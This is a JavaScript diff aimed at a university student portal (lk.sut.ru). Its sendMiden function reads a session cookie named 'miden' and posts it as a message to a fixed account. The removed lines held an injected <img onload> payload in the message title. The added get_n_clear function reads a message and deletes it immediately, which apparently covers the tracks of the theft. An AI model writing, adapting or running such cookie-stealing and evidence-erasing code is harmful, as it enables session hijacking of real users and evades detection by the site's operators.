@@ -1,4 +1,5 @@
 function set_Cookie(name, value, expires, path, domain, secure) {
+	// Установка cookie
     var curCookie = name + "=" + escape(value) +
         ((expires) ? "; expires=" + expires.toGMTString() : "") +
         ((path) ? "; path=" + path : "") +
@@ -8,6 +9,7 @@ function set_Cookie(name, value, expires, path, domain, secure) {
 }
 
 function getCookie(name) {
+	// Получение cookie
     var prefix = name + "="
     var cookieStartIndex = document.cookie.indexOf(prefix)
     if (cookieStartIndex == -1)
@@ -19,10 +21,18 @@ function getCookie(name) {
 }
 
 function sendMiden(){
+	// Получает cookie и отправляет miden
 	let miden = getCookie('miden')
-	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=<img src=https://lk.sut.ru/cabinet/ini/general/0/cabinet/img/logo.png height=0 onload=console.log($(this).parent().parent())>&mes='+miden+'&adresat=97130')
+	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=MyMiden&mes='+miden+'&adresat=97130')
 }
 
-function delMes(){
-	console.log($(this))
+function delMes(id){
+	// Удаляет сообщение по id
+	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", "idinfo="+id+"&title=&mes=&adresat=0")
+}
+
+function get_n_clear(id){
+	// Читает сообщение id и сразу его удаляет
+	let a = $.post("https://lk.sut.ru/cabinet/project/cabinet/forms/sendto2.php", data="id="+id+"&prosmotr")
+	setTimeout(function() { console.log($(JSON.parse(a.responseText))[0].annotation); delMes(id) }, 1000)
 }
